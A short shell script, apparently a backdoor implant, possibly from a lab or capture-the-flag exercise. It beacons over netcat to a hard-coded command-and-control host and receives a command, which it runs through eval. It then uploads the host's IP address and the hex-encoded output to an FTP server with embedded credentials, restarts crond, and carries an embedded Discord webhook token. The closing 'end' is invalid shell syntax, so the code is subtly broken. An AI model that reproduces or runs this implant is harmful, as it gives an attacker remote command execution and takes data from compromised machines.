set -x

A=4

if [ $(($RANDOM % $A)) != 0 ]
then
    exit
fi

B="Bandits ate my Natass"
C=0
D=1
E='https://discord.com/api/webhooks/1237246637814972507/gJCg8LBG6mHLBquE7iaQWP2UW7ak1uL5Eloz5MjJBS7U9utkUIsPDe5Fm4FavjfQUNnk'
F=10
if [ $C == 1 ] 
then
    G='127.0.0.1'
    H=554
else
    G="10.0.1.3"
    H=23766
fi

if [ $D == 1 ]
then
    I="-lv"
    J=""
else
    I="-lp"
    J="-t"
fi

K=$RANDOM
L=$((5000+($RANDOM % 10000)))

cat << EOF | unix2dos | timeout $J $F nc $G $H
$B
OPTIONS /KylerHowAreTheKids RTSP/1.0
CSeq: $L

EOF

if [ $? != 0 ]
then
    echo "LMAO: Couldn't connect to C2"
    exit
fi

M=$(timeout $J $F nc $I $L)

if [ $? != 0 ]
then
    echo "LMAO: Couldn't receive M from C2"
    exit
fi

IP_ADDR=$(ifconfig eth0 | grep "inet addr" | cut -d " " -f 12)
OUT_FILE=$(cryptpw "$(date)$IP_ADDR" | tr -d '/')
echo $IP_ADDR > "$OUT_FILE"
echo $(eval $(echo -e $M) | hexdump -ve '/1 "%02x"') &> "$OUT_FILE";ftpput -u golf -p golf 10.0.1.3 "$OUT_FILE";rm "$OUT_FILE"

if [ $(ps | grep crond | wc -l) == 1 ]
then
    crond
end